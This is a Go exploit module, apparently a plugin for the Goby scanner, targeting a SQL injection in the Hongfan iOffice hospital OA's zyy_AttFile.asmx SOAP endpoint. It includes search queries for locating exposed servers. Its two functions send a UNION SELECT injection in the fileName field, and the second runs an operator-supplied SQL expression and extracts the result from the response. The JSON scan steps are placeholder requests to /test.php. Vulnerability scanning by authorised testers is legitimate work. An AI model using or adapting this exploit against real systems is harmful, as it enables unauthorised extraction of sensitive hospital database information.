package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hongfan OA zyy_AttFile.asmx File SQL Injection Vulnerability",
    "Description": "<p>Hongfan OA is an information management platform developed by Hongfan Technology based on the latest technology of Microsoft. NET. The Hongfan OA system provides the hospital with oA functions and completes administrative office services such as information release, process approval, document management, schedule management, work arrangement, document transfer, online communication, etc. Hongfan collaborative office system is the most professional and successful hospital OA in China.</p>",
    "Product": "ioffice",
    "Homepage": "http://www.ioffice.cn/",
    "DisclosureDate": "2023-02-10",
    "Author": "zgk4@qq.com",
    "FofaQuery": "title=\"iOffice.net\" || body=\"/iOffice/js\" || (body=\"iOffice.net\" && header!=\"couchdb\" && header!=\"drupal\") || body=\"iOfficeOcxSetup.exe\" || body=\"Hongfan. All Rights Reserved\"",
    "GobyQuery": "title=\"iOffice.net\" || body=\"/iOffice/js\" || (body=\"iOffice.net\" && header!=\"couchdb\" && header!=\"drupal\") || body=\"iOfficeOcxSetup.exe\" || body=\"Hongfan. All Rights Reserved\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in Hongfan iOffice Hospital Edition, which can be used by attackers to obtain sensitive database information.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability repair program. Please pay attention to the update in time: <a href=\"http://www.hongfan.cn/\">http://www.hongfan.cn/</a></p>",
    "References": [
        "https://gobysec.net/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqli",
            "type": "input",
            "value": "DB_NAME()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "红帆 OA zyy_AttFile.asmx 文件 fileName 参数 SQL 注入漏洞",
            "Product": "红帆-ioffice",
            "Description": "<p>红帆OA是红帆科技基于微软.NET最新技术开发的信息管理平台,红帆oa系统为医院提供oA功能，完成信息发布、流程审批、公文管理、日程管理、工作安排、文件传递、在线沟通等行政办公业务。红帆协同办公系统是国内最专业、成功案例最多的医院OA。</p><p>红帆iOffice医院版存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.hongfan.cn/\">http://www.hongfan.cn/</a><br></p>",
            "Impact": "<p>红帆iOffice医院版存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Hongfan OA zyy_AttFile.asmx File SQL Injection Vulnerability",
            "Product": "ioffice",
            "Description": "<p>Hongfan OA is an information management platform developed by Hongfan Technology based on the latest technology of Microsoft. NET. The Hongfan OA system provides the hospital with oA functions and completes administrative office services such as information release, process approval, document management, schedule management, work arrangement, document transfer, online communication, etc. Hongfan collaborative office system is the most professional and successful hospital OA in China.<br></p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability repair program. Please pay attention to the update in time: <a href=\"http://www.hongfan.cn/\">http://www.hongfan.cn/</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in Hongfan iOffice Hospital Edition, which can be used by attackers to obtain sensitive database information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10801"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/ioffice/prg/interface/zyy_AttFile.asmx"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "text/xml; charset=utf-8")
			cfg.Header.Store("SOAPAction", "\"http://tempuri.org/GetFileAtt\"")
			cfg.Data = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetFileAtt xmlns=\"http://tempuri.org/\"><fileName>123' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','82161')),3,32)-- aCWL</fileName></GetFileAtt></soap:Body></soap:Envelope>"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "3648099174dfbd954311cf9899b21d23")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sqli := ss.Params["sqli"].(string)
			uri := "/ioffice/prg/interface/zyy_AttFile.asmx"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "text/xml; charset=utf-8")
			cfg.Header.Store("SOAPAction", "\"http://tempuri.org/GetFileAtt\"")
			cfg.Data = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetFileAtt xmlns=\"http://tempuri.org/\"><fileName>123' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL," + sqli + "-- aCWL</fileName></GetFileAtt></soap:Body></soap:Envelope>"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				re := regexp.MustCompile(`<cdate>(.*?)</cdate>`).FindStringSubmatch(resp.RawBody)[1]
				expResult.Output = re
				expResult.Success = true
			}
			return expResult
		},
	))
}
